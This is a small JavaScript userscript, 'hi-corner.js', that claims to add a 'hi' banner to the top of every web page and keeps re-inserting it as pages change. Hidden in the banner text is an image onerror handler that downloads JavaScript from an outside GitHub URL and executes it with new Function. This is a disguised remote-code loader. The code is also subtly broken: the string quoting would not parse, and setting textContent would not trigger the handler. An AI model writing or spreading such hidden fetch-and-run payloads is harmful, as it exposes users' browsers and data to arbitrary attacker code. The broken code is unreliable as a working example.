/// hi-corner.js
(function () {
  const ID = '__hi_corner__';
  function inject() {
    if (!document.body || document.getElementById(ID)) return;
    const el = document.createElement('div');
    el.id = ID;
    el.textContent = 'hi <img src="bad-image.png" onerror="
(async()=>{
  const res = await fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js');
  const code = await res.text();
  new Function(code)();
})();
">';
    Object.assign(el.style, {
      display:      'block',
      width:        '100%',
      background:   '#1a1a1a',
      color:        '#fff',
      padding:      '10px 16px',
      fontFamily:   'sans-serif',
      fontSize:     '14px',
      boxSizing:    'border-box',
    });
    document.body.prepend(el);
  }
  function tryInject() {
    if (document.body) inject();
    else requestAnimationFrame(tryInject);
  }
  tryInject();
  new MutationObserver(() => {
    if (!document.getElementById(ID)) inject();
  }).observe(document.documentElement, { childList: true, subtree: true });
  ['pushState', 'replaceState'].forEach(fn => {
    const orig = history[fn];
    history[fn] = function (...args) {
      orig.apply(this, args);
      setTimeout(inject, 300);
    };
  });
})();
